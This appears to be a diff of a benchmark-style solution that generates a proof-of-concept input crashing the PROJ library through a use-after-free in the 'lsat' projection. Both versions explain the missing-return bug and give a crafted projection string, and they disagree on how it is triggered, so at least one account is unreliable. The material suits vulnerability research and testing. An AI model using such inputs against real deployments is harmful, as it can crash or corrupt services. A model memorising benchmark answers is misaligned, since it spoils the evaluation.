@@ -1,29 +1,34 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability CVE-2018-7264.
+        Generate a PoC that triggers the vulnerability.
 
-        The vulnerability exists in the PROJ.4 library, specifically in the
-        initialization of the 'lsat' projection (`pj_lsat.c`). When parsing
-        parameters for this projection, an invalid value for the 'row'
-        parameter causes an allocated memory block to be freed. However, due
-        to a missing return statement, the function continues execution and
-        attempts to write to this now-freed memory, leading to a heap
-        use-after-free.
+        Args:
+            src_path: Path to the vulnerable source code tarball
 
-        The PoC is a PROJ.4 string that:
-        1. Selects the vulnerable projection: `+proj=lsat`
-        2. Passes the initial parameter checks with valid values for 'ls'
-           and 'path'. The valid range for 'ls' is [1, 5] and for 'path'
-           is [1, 255]. We use the shortest valid values, `+ls=1` and `+path=1`.
-        3. Triggers the vulnerability with an invalid value for 'row'. The
-           valid range is [1, 255]. We use `+row=0`, which is invalid and
-           the shortest representation of an invalid value.
-
-        This crafted string will cause a crash in the vulnerable version when
-        a sanitizer like ASan is used, while the fixed version will handle it
-        as a regular error. The PoC is made as short as possible to maximize
-        the score.
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
         """
-        poc = b"+proj=lsat +ls=1 +path=1 +row=0"
-        return poc
+        # The vulnerability is a Use-After-Free in the inverse transformation
+        # of the 'lsat' (Landsat) projection in the PROJ library.
+        # A missing `return` statement after `pj_free()` in an error handling
+        # path causes this vulnerability.
+        #
+        # To trigger the bug:
+        # 1. Use the 'lsat' projection. The minimal required parameter to
+        #    initialize this projection is `+path`.
+        # 2. Provide input coordinates for the inverse transformation where the
+        #    latitude is at or very near +/- 90 degrees (the poles). This
+        #    triggers the specific error condition.
+        #
+        # The expected input format for the vulnerable program is a projection
+        # string on the first line, followed by coordinates on subsequent lines.
+        # This PoC provides a minimal, valid projection string and the
+        # triggering coordinates.
+
+        proj_string = b"+proj=lsat +path=1"
+        coords = b"0 90"
+        
+        # A newline separates the projection string from the coordinates.
+        # Another newline is added at the end, which is common for line-based inputs.
+        return proj_string + b"\n" + coords + b"\n"
